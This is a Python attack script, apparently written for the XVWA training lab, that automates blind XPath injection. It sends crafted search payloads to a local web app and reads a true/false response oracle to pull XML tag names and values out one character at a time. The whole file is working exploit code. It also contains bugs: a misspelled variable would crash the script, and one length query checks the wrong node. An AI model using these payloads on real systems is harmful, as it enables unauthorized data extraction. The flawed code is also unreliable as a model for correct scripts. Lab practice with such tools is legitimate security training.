#!/bin/python3

import requests
import sys
import time
import pwn
import signal
import string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://192.168.1.143/xvwa/vulnerabilities/xpath/"

characters = string.printable

def xPathInjectionGetAmountMainTag():
    length = 0
    length_found = False
    while not length_found:
        post_data = { 
                'search' : "1' and count(/*)='%d" % length,
                'submit' : ''
                }
        r = requests.post(main_url, data=post_data)

        if "Affogato" in r.text:
            #print("[+] La longitud es de %d caracteres" % length)
            length_found = True
        else:
            length += 1
    #print("[+] There are %d Main Tags" % length)
    return length


def xPathInjectionMainTag(main_tag_index):
    length = 0
    length_found = False
    while not length_found:
        post_data = { 
                'search' : "1' and string-length(name(/*[%d]))='%d" % (main_tag_index,length),
                'submit' : ''
                }
        r = requests.post(main_url, data=post_data)

        if "Affogato" in r.text:
            #print("[+] La longitud es de %d caracteres" % length)
            length_found = True
        else:
            length += 1
    name = ""
    for i in range(1, length+1):
        for char in characters:
            post_data = { 
                    'search' : "1' and substring(name(/*[%d]),%d,1)='%s" % (main_tag_index,i, char),
                    'submit' : '' 
                    }
            r = requests.post(main_url, data=post_data)
            if "Affogato" in r.text:
                name += char
                break
    #print("[+] Main Tag %d Name: %s" % (main_tag_index, name))
    return name

def xPathInjectionMainTagValue(main_tag_index):
    length = 0
    length_found = False
    while not length_found:
        post_data = { 
                'search' : "1' and string-length(/*[%d])='%d" % (main_tag_index,length),
                'submit' : ''
                }
        r = requests.post(main_url, data=post_data)

        if "Affogato" in r.text:
            length_found = True
        else:
            length += 1
    value = ""
    for i in range(1, length+1):
        for char in characters:
            post_data = { 
                    'search' : "1' and substring(/*[%d],%d,1)='%s" % (main_tag_index,i, char),
                    'submit' : '' 
                    }
            r = requests.post(main_url, data=post_data)
            if "Affogato" in r.text:
                value += char
                break
    return value


def xPathInjectionGetAmountSecondaryTag(main_tag_index):
    length = 0
    length_found = False
    while not length_found:
        post_data = { 
                'search' : "1' and count(/*[%d]/*)='%d" % (main_tag_index,length),
                'submit' : ''
                }
        r = requests.post(main_url, data=post_data)

        if "Affogato" in r.text:
            #print("[+] La longitud es de %d caracteres" % length)
            length_found = True
        else:
            length += 1
    #print("[+] There are %d Secondary Tags" % length)
    return length



def xPathInjectionSecondaryTag(main_tag_index, secondary_tag_index):
    length = 0
    length_found = False
    while not length_found:
        post_data = { 
                'search' : "1' and string-length(name(/*[%d]/*[%d]))='%d" % (main_tag_index,secondary_tag_index,length),
                'submit' : ''
                }
        r = requests.post(main_url, data=post_data)

        if "Affogato" in r.text:
            #print("[+] La longitud es de %d caracteres" % length)
            length_found = True
        else:
            length += 1
    name = ""
    for i in range(1, length+1):
        for char in characters:
            post_data = { 
                    'search' : "1' and substring(name(/*[%d]/*[%d]),%d,1)='%s" % (main_tag_index,secondary_tag_index,i, char),
                    'submit' : '' 
                    }
            r = requests.post(main_url, data=post_data)
            if "Affogato" in r.text:
                name += char
                break
    #print("[+] Secondary Tag %d Name: %s" % (main_tag_index, name))
    return name

def xPathInjectionSecondaryTagValue(main_tag_index, secondary_tag_index):
    length = 0
    length_found = False
    while not length_found:
        post_data = { 
                'search' : "1' and string-length(/*[%d]/*[%d])='%d" % (main_tag_index,secondary_tag_index,length),
                'submit' : ''
                }
        r = requests.post(main_url, data=post_data)

        if "Affogato" in r.text:
            length_found = True
        else:
            length += 1
    value = ""
    for i in range(1, length+1):
        for char in characters:
            post_data = { 
                    'search' : "1' and substring(/*[%d]/*[%d],%d,1)='%s" % (main_tag_index,secondary_tag_index,i, char),
                    'submit' : '' 
                    }
            r = requests.post(main_url, data=post_data)
            if "Affogato" in r.text:
                value += char
                break
    return value



def xPathInjectionGetAmountTertiaryTag(main_tag_index, secondary_tag_index):
    length = 0
    length_found = False
    while not length_found:
        post_data = { 
                'search' : "1' and count(/*[%d]/*[%d]/*)='%d" % (main_tag_index,secondary_tag_index, length),
                'submit' : ''
                }
        r = requests.post(main_url, data=post_data)

        if "Affogato" in r.text:
            length_found = True
        else:
            length += 1
    return length



def xPathInjectionTertiaryTag(main_tag_index, secondary_tag_index, tertiary_tag_index):
    length = 0
    length_found = False
    while not length_found:
        post_data = { 
                'search' : "1' and string-length(name(/*[%d]/*[%d]))='%d" % (main_tag_index,secondary_tag_index,length),
                'submit' : ''
                }
        r = requests.post(main_url, data=post_data)

        if "Affogato" in r.text:
            length_found = True
        else:
            length += 1
    name = ""
    for i in range(1, length+1):
        for char in characters:
            post_data = { 
                    'search' : "1' and substring(name(/*[%d]/*[%d]/*[%d]),%d,1)='%s" % (main_tag_index,secondary_tag_index,tertiary_tag_index,i, char),
                    'submit' : '' 
                    }
            r = requests.post(main_url, data=post_data)
            if "Affogato" in r.text:
                name += char
                break
    return name

def xPathInjectionTertiaryTagValue(main_tag_index, secondary_tag_index, tertiary_tag_index):
    length = 0
    length_found = False
    while not length_found:
        post_data = { 
                'search' : "1' and string-length(/*[%d]/*[%d]/*[%d])='%d" % (main_tag_index,secondary_tag_index,tertiary_tag_index,length),
                'submit' : ''
                }
        r = requests.post(main_url, data=post_data)

        if "Affogato" in r.text:
            length_found = True
        else:
            length += 1
    value = ""
    for i in range(1, length+1):
        for char in characters:
            post_data = { 
                    'search' : "1' and substring(/*[%d]/*[%d]/*[%d],%d,1)='%s" % (main_tag_index,secondary_tag_index,tertiary_tag_index,i, char),
                    'submit' : '' 
                    }
            r = requests.post(main_url, data=post_data)
            if "Affogato" in r.text:
                value += char
                break
    return value

def xPathInjectionGetAmountQuaternaryTag(main_tag_index, secondary_tag_index, tertiary_tag_index):
    length = 0
    length_found = False
    while not length_found:
        post_data = { 
                'search' : "1' and count(/*[%d]/*[%d]/*[%d]/*)='%d" % (main_tag_index,secondary_tag_index,tertiary_tag_index, length),
                'submit' : ''
                }
        r = requests.post(main_url, data=post_data)

        if "Affogato" in r.text:
            length_found = True
        else:
            length += 1
    return length



if __name__ == '__main__':
    main_tags_amount = xPathInjectionGetAmountMainTag()
    for i in range(1, main_tags_amount+1):
        main_tag_name = xPathInjectionMainTag(i)
        secondary_tags_amount = xPathInjectionGetAmountSecondaryTag(i)
        if secondary_tags_amount == 0:
            main_tag_value = xPathInjectionMainTagValue(i)
            print("[+] Main Tag Name: %s - Value: %s" % (main_tag_name,main_tag_value))
        else:
            print("[+] Main Tag Name: %s" % main_tag_name)
            for j in range(1, secondary_tags_amount+1):
                secondary_tag_name = xPathInjectionSecondaryTag(i,j)
                tertiary_tags_amount = xPathInjectionGetAmountTertiaryTag(i,j)
                if tertiary_tags_amount == 0:
                    secodary_tag_value = xPathInjectionSecondaryTagValue(i,j)
                    print("[+]     Secondary Tag Name: %s - Value: %s" % (secondary_tag_name,secondary_tag_value))
        
                else:
                    print("[+]     Secondary Tag Name: %s" % secondary_tag_name)
                    for k in range(1, tertiary_tags_amount+1):
                        tertiary_tag_name = xPathInjectionTertiaryTag(i,j,k)
                        quaternary_tags_amount = xPathInjectionGetAmountQuaternaryTag(i,j,k)
                        if quaternary_tags_amount == 0:
                            tertiary_tag_value = xPathInjectionTertiaryTagValue(i,j,k)
                            print("[+]         Tertiary Tag Name: %s - Value: %s" % (tertiary_tag_name,tertiary_tag_value))
        
                        else:
                            print("[+]        Tertiary Tag Name: %s" % tertiary_tag_name)

    #xPathInjectionSecondaryTag(1,1)
